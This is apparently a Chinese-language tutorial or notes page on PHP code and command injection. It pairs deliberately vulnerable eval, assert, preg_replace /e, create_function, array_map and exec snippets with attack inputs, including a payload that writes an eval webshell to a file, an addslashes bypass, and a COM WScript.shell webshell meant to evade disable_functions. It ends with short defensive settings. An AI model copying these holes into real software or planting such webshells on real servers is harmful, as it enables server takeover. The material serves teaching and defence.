
## php 代码执行

* eval


```
# 1. 没有任何过滤
<?php
@eval($_GET["cmd"]);
?>

visit: ?cmd=phpinfo();
       ?cmd=fputs(fopen('test.php','w'),'<?php @eval($_POST[test])?>')

# 2. addslashes 过滤
<?php
$cmd = @(string)$_GET["cmd"];
eval('$cmd="' . addslashes($cmd) . '";');
?>
# ${${}} 绕过
cmd=${${phpinfo()}}

# 3 引号包含过滤
<?php
$cmd = "echo \"hello " . $_GET['cmd'] . "\";";
eval($cmd);
# ${${}} 绕过
cmd=${${phpinfo()}}
```

* assert()

```
<?php
@assert($_GET["cmd"]);
?>
cmd=phpinfo();
```

* preg_replace + '/e'

```
# 1. parameter 1
# magic_quotes_gpc=Off时，导致代码执行。
<?php
$regexp = $_GET['reg'];
$var = '<php>phpinfo()</php>';
preg_replace("/<php>(.*?)$regexp", '\\1', $var);
?>
reg=%3C\/php%3E/e, 执行 phpinfo.

# 2. parameter 2
# 当replacement 参数构成一个合理的php 代码字符串的时候
# /e 修正符使preg_replace()，将replacement 参数当做php 代码执行
<?php
preg_replace("//e", $_GET['cmd'], "cmd test");
?>
cmd=phpinfo();

# 3. parameter 3
<?
preg_replace("/\s*\[php\](.+?)\[\/php\]\s*/ies", "\\1", $_GET['h']);
?>
h=[php]phpinfo()[/php]
```

* call_user_func

* call_user_func_array

* create_function

```
<?php
$cmd = $_GET['cmd'];
$func = create_function('$arg1, $arg2', $cmd);
$func(1, 2);
?>
cmd=phpinfo();
```

*  array_map

```
<?php
$evil_callback = $_GET['callback'];
$some_array = array(0, 1, 2, 3);
$new_array = array_map($evil_callback, $some_array);
?>
callback=phpinfo
```

## php 执行系统命令

php能够执行系统命令的函数有：

assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,`` `(反单引号)``

* shell_exec()

> string shell_exec ( string $cmd )

命令执行的输出。 如果执行过程中发生错误或者进程不产生输出，则返回 NULL。

* system()

> string system ( string $command [, int &$return_var ］)

成功则返回命令输出的结果， 失败则返回 FALSE

* exec()

> string exec( string $command [, array &$output [, int &$return_var ］)

返回命令执行结果的最后一行内容

```
<?php
$cmd = $_GET["cmd"];
$output = array();
echo "<pre>";
exec($cmd,$output);
echo "</pre>";
while(list($key,$value)=each($output))
{
    echo $value."<br>";
}
?>
cmd=ifconfig
```

* passthru

> void passthru ( string $command [, int &$return_var ］ )

直接将结果输出到游览器,不返回任何值

* popen()

* proc_open()

* `(反撇号) 与 shell_exec 功能相同

```
$ php -r 'echo `ls -l`;'
```

### 防御

* php.ini

```
safe_mode = On      #safe mode
safe_mode_exec_dir = /usr/local/php/bin/    #limit path

disable_functions="eval,phpinfo"
```

* 使用escapeshellcmd()和escapeshellarg()函数阻止用户恶意在系统上执行命令

    + escapeshellcmd()针对的是执行的系统命令

    + escapeshellarg()针对的是执行系

### 绕过

* windows 组件绕过

```
# 防御：直接删除system32下的wshom.ocx文件
<?php
$command = $_POST[a];
$wsh = new COM('WScript.shell');    //生成一个COM对象
$exec = $wsh->exec('cmd.exe /c '.$command);    //调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput
?>
```

## 防御

1、尽量不要执行外部命令

2、使用自定义函数或函数库来替代外部命令的功能

3、使用escapeshellarg函数来处理命令参数

4、使用safe_mode_exec_dir指定可执行文件的路径

esacpeshellarg函数会将任何引起参数或命令结束的字符转义，单引号“’”，替换成“\’”，双引号“"”，替换成“\"”，分号“;”替换成“\;”

用safe_mode_exec_dir指定可执行文件的路径，可以把会使用的命令提前放入此路径内

safe_mode = On

safe_mode_exec_dir = /usr/local/php/bin/
